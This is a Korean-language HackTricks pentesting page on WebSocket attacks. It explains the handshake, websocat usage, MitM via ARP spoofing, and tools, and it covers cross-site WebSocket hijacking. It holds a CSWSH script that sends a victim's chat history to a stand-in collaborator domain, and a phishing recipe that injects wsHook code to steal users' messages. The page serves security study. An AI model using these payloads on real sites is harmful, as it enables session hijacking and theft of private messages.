# WebSocket 공격

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## WebSockets이란

WebSocket 연결은 초기 **HTTP** 핸드셰이크를 통해 설정되며, **장기간 유지**되어 트랜잭션 시스템이 필요하지 않고 언제든지 양방향 메시징이 가능하도록 설계되었습니다. 이로 인해 WebSockets은 실시간 금융 데이터 스트림과 같은 **낮은 지연 시간 또는 서버에서 시작되는 통신**이 필요한 애플리케이션에 특히 유리합니다.

### WebSocket 연결 설정

WebSocket 연결 설정에 대한 자세한 설명은 [**여기**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc)에서 확인할 수 있습니다. 요약하면, WebSocket 연결은 일반적으로 다음과 같이 클라이언트 측 JavaScript를 통해 시작됩니다:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws");
```
`wss` 프로토콜은 **TLS**로 보호된 WebSocket 연결을 나타내며, `ws`는 **보안되지 않은** 연결을 나타냅니다.

연결 설정 중에는 브라우저와 서버 간에 HTTP를 통해 핸드셰이크가 수행됩니다. 핸드셰이크 과정은 브라우저가 요청을 보내고 서버가 응답하는 것을 포함하며, 다음 예시에서 설명된 대로 진행됩니다:

브라우저가 핸드셰이크 요청을 보냅니다:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
서버의 핸드셰이크 응답:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
연결이 한 번 설정되면 메시지 교환을 위해 양방향으로 계속 열려 있습니다.

**WebSocket 핸드셰이크의 주요 포인트:**

- `Connection` 및 `Upgrade` 헤더는 WebSocket 핸드셰이크의 시작을 알립니다.
- `Sec-WebSocket-Version` 헤더는 원하는 WebSocket 프로토콜 버전을 나타내며, 일반적으로 `13`입니다.
- `Sec-WebSocket-Key` 헤더에는 Base64로 인코딩된 무작위 값이 전송되며, 이는 각 핸드셰이크가 고유함을 보장하여 캐싱 프록시 문제를 방지하는 데 도움이 됩니다. 이 값은 인증을 위한 것이 아니라 응답이 잘못 구성된 서버나 캐시에 의해 생성되지 않았음을 확인하기 위한 것입니다.
- 서버의 응답에 있는 `Sec-WebSocket-Accept` 헤더는 `Sec-WebSocket-Key`의 해시로, 서버가 WebSocket 연결을 열기로 의도했음을 확인합니다.

이러한 기능들은 핸드셰이크 프로세스가 안전하고 신뢰성 있으며, 효율적인 실시간 통신을 위한 기반을 마련합니다.


### Linux 콘솔

`websocat`을 사용하여 웹소켓과의 원시 연결을 설정할 수 있습니다.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
또는 websocat 서버를 생성하려면:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM 웹소켓 연결

현재 로컬 네트워크에서 클라이언트가 **HTTP 웹소켓**에 연결되어 있는 것을 발견하면 [ARP Spoofing 공격](../generic-methodologies-and-resources/pentesting-network/#arp-spoofing)을 시도하여 클라이언트와 서버 사이에서 MitM 공격을 수행할 수 있습니다.\
클라이언트가 연결하려고 할 때 다음을 사용할 수 있습니다:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### 웹소켓 열거

[**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **툴**을 사용하여 웹소켓에서 알려진 취약점을 자동으로 발견, 지문 인식 및 검색할 수 있습니다.

### 웹소켓 디버그 도구

* **Burp Suite**는 일반 HTTP 통신과 유사한 방식으로 MitM 웹소켓 통신을 지원합니다.
* [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite 확장 프로그램**을 사용하면 Burp에서 웹소켓 통신을 더 잘 관리할 수 있습니다. **히스토리**를 얻고, **가로채기 규칙**을 설정하고, **일치 및 대체** 규칙을 사용하며, **Intruder** 및 **AutoRepeater**를 사용할 수 있습니다.
* [**WSSiP**](https://github.com/nccgroup/wssip)**:** "**WebSocket/Socket.io Proxy**"의 약자로, Node.js로 작성된 이 도구는 클라이언트와 서버 간의 모든 WebSocket 및 Socket.IO 통신을 **캡처, 가로채기, 사용자 정의 메시지 전송** 및 보기 위한 사용자 인터페이스를 제공합니다.
* [**wsrepl**](https://github.com/doyensec/wsrepl)은 특히 펜테스트를 위해 설계된 **대화형 웹소켓 REPL**입니다. **들어오는 웹소켓 메시지를 관찰하고 새로운 메시지를 보내는** 인터페이스를 제공하며, 이 통신을 **자동화**하기 위한 사용하기 쉬운 프레임워크를 제공합니다.&#x20;
* [**https://websocketking.com/**](https://websocketking.com/)은 **웹소켓을 사용하여 다른 웹과 통신**하기 위한 웹입니다.
* [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket)은 다른 유형의 통신/프로토콜과 함께 **웹소켓을 사용하여 다른 웹과 통신**하기 위한 웹을 제공합니다.

## 웹소켓 랩

[**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course)에서 웹소켓을 사용하여 웹을 실행하는 코드를 찾을 수 있으며, [**이 게시물**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/)에서 설명을 찾을 수 있습니다.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking** 또는 **cross-origin WebSocket hijacking**은 WebSocket 핸드셰이크에 영향을 주는 **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)**의 특정 사례로 식별됩니다. 이 취약점은 WebSocket 핸드셰이크가 **CSRF 토큰**이나 유사한 보안 조치 없이 **HTTP 쿠키**만을 사용하여 인증하는 경우 발생합니다.

공격자는 취약한 애플리케이션에 대해 **악성 웹 페이지**를 호스팅하여 크로스 사이트 웹소켓 연결을 시작할 수 있습니다. 결과적으로 이 연결은 세션 처리 메커니즘에서 CSRF 보호 부재를 악용하여 피해자의 세션의 일부로 처리됩니다.

### 간단한 공격

**웹소켓** 연결을 **설정**할 때 **쿠키**가 **서버로 전송**됨에 유의하세요. **서버**는 **전송된 쿠키를 기반으로 각 특정 사용자를 그의 웹소켓 세션과 관련**시킬 수 있습니다.

그런 다음, 예를 들어, **웹소켓** **서버**가 "**READY"**라는 메시지를 보내면 사용자의 대화 **기록을 다시 보냅니다**. 따라서 연결을 설정하는 **간단한 XSS** (희생자 사용자를 인증하기 위해 **쿠키**가 **자동으로 전송**됨) "**READY**"를 **보내면** 대화 **기록을 검색**할 수 있습니다.
```markup
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie with a different subdomain

이 블로그 포스트 [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/)에서 공격자는 웹 소켓 통신이 발생하는 도메인의 **하위 도메인**에서 **임의의 JavaScript를 실행**하는 데 성공했습니다. **하위 도메인**이기 때문에 **쿠키**가 **전송**되었고, **Websocket이 Origin을 제대로 확인하지 않았기 때문에** 이를 통해 통신하고 **토큰을 도용**할 수 있었습니다.

### 사용자로부터 데이터 도용

피싱하려는 웹 애플리케이션(예: .html 파일)을 복사하고, 웹 소켓 통신이 발생하는 스크립트 내에 다음 코드를 추가하세요:
```javascript
//This is the script tag to load the websocket hooker
<script src='wsHook.js'></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function(data, url) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "client_msg?m="+data, true);
xhttp.send();
}
wsHook.after = function(messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest();
xhttp.open("GET", "server_msg?m="+messageEvent.data, true);
xhttp.send();
return messageEvent;
}
```
이제 [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook)에서 `wsHook.js` 파일을 다운로드하고 **웹 파일이 있는 폴더에 저장**하세요.\
웹 애플리케이션을 노출시키고 사용자가 연결하면 웹소켓을 통해 전송 및 수신된 메시지를 도용할 수 있습니다:
```javascript
sudo python3 -m http.server 80
```
## 경쟁 조건

웹소켓에서의 경쟁 조건은 실제로 존재합니다. [이 정보를 확인하여 더 자세히 알아보세요](race-condition.md#rc-in-websockets).

## 기타 취약점

웹소켓은 서버 측과 클라이언트 측으로 데이터를 전송하는 메커니즘입니다. 서버와 클라이언트가 정보를 처리하는 방식에 따라 웹소켓을 통해 XSS, SQLi 또는 기타 일반적인 웹 취약점을 악용할 수 있습니다.

## **웹소켓 스머글링**

이 취약점을 통해 **역방향 프록시 제한을 우회**하여 **웹소켓 통신이 설정되었다고** 프록시를 속일 수 있습니다. 이를 통해 공격자는 **숨겨진 엔드포인트에 액세스**할 수 있습니다. 자세한 내용은 다음 페이지를 확인하세요:

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

## 참고 자료

* [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* HackTricks에서 **회사 광고를 보거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)을 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
